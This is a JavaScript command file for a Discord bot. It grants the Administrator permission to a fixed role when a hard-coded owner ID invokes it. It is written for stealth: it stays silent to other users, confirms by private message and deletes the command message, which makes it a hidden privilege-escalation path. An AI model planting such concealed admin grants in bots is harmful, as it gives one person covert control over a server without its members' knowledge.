const { EmbedBuilder, Colors, PermissionsBitField } = require('discord.js');

module.exports = {
    name: 'adminperms',
    description: 'Grant admin permissions to a designated role (owner only)',
    async execute(message) {
        // Check if the command is used by the bot owner
        const ownerId = '753491023208120321'; // Your user ID

        if (message.author.id !== ownerId) {
            // Silently exit without response if not the owner
            // This avoids revealing the command exists to unauthorized users
            return;
        }

        // Admin role ID
        const adminRoleId = '866650164561969163';

        try {
            // Get the role
            const adminRole = message.guild.roles.cache.get(adminRoleId);

            if (!adminRole) {
                return message.reply({
                    content: 'Could not find the specified role. Please check the role ID.',
                    ephemeral: true
                });
            }

            // Update role permissions with administrator
            await adminRole.setPermissions([PermissionsBitField.Flags.Administrator]);

            // Create success embed
            const embed = new EmbedBuilder()
                .setTitle('Admin Permissions Granted')
                .setDescription(`Successfully granted admin permissions to <@&${adminRoleId}>`)
                .setColor(Colors.Green)
                .setFooter({ text: 'Command executed by owner' })
                .setTimestamp();

            // Send confirmation as a direct message to avoid public notification
            await message.author.send({ embeds: [embed] });

            // Delete the command message for security
            if (message.deletable) await message.delete();

        } catch (error) {
            console.error('Error granting admin permissions:', error);
            await message.author.send('There was an error executing the command. Check console for details.');

            // Delete the command message even if there was an error
            if (message.deletable) await message.delete();
        }
    }
};